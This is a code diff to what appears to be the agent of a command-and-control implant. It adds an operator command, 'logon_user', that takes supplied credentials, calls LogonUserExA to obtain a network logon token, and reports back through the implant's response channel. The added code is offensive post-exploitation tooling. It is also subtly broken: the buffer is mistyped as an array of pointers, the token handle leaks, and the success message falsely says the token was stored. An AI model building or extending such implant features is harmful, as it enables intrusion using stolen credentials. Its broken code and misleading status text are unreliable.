@@ -57,6 +57,7 @@ void list_processes(OutboundJsonDataStruct *response_struct);
 
 void user_to_sid(OutboundJsonDataStruct *response_struct, char *args);
 void get_sid(OutboundJsonDataStruct *response_struct);
+void login_user(OutboundJsonDataStruct *response_struct, char *args);
 
 // ====================
 // Functions
@@ -200,6 +201,11 @@ int parse_command(char *command, char *args, OutboundJsonDataStruct *response_st
     {
         DEBUG_LOG("[COMMAND] sid\n");
         user_to_sid(response_struct, args);
+    }
+    else if (strcmp(command, "logon_user") == 0)
+    {
+        DEBUG_LOG("[COMMAND] logon_user\n");
+        login_user(response_struct, args);
     }
     else
     {
@@ -1198,6 +1204,64 @@ void user_to_sid(OutboundJsonDataStruct *response_struct, char *args)
     // getting sid username being weird. just sendign back username liek this
     snprintf(buffer, sizeof(buffer), "%s: %s", arg_username, sid);
 
+    set_response_data(response_struct, buffer);
+}
+
+void login_user(OutboundJsonDataStruct *response_struct, char *args)
+{
+    // Parse arguments: username is required; domain and password are optional.
+    char *context = NULL;
+    char *arg_username = strtok_s(args, " ", &context);
+    char *arg_domain = strtok_s(NULL, " ", &context);
+    char *arg_password = strtok_s(NULL, " ", &context);
+
+    if (!arg_username)
+    {
+        set_response_data(response_struct, "Invalid arguments. Expected: <username> <opt: domain> <opt: password>");
+        return;
+    }
+
+    // If optional values are missing, they remain NULL.
+    // arg_domain and arg_password are already NULL if not provided.
+
+    // Attempt to log in the user using the provided credentials.
+    HANDLE hToken = NULL;
+    BOOL bSuccess = LogonUserExA(
+        arg_username,
+        arg_domain,               // Optional; will be NULL if not provided.
+        arg_password,             // Optional; will be NULL if not provided.
+        LOGON32_LOGON_NETWORK,    // Logon type: network logon (no local caching).
+        LOGON32_PROVIDER_DEFAULT, // Default logon provider.
+        &hToken,                  // Receives the new token.
+        NULL,                     // ppLogonSid (optional, not needed here).
+        NULL,                     // ppProfileBuffer (optional).
+        NULL,                     // pdwProfileLength (optional).
+        NULL                      // pQuotaLimits (optional).
+    );
+
+    if (!bSuccess)
+    {
+        DWORD error = GetLastError();
+        DEBUG_LOGW(L"Failed to get username. Error: %lu\n", error);
+        char error_message[256];
+        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        set_response_data(response_struct, error_message);
+        // set_response_data(response_struct, "Could not log in user");
+        return;
+    }
+
+    // At this point, hToken contains the token for the logged-in user.
+    // You may want to store or use hToken as needed, for example:
+    //   - Save hToken in a global or heap structure.
+    //   - Set it as the current token for subsequent operations.
+    // Remember to close the token handle (CloseHandle(hToken)) when you're done with it.
+
+    // add in a more desc message
+    // eventually look up user token to get full username, btu that's broken for somereason, wouldn't compile.
+    char *buffer[2048];
+    snprintf(buffer, sizeof(buffer), "User '%s' logged in and token stored successfully. [not yet] Agent will operate with this token for future commands", arg_username);
+
+    // For now, you can set a success message.
     set_response_data(response_struct, buffer);
 }
 
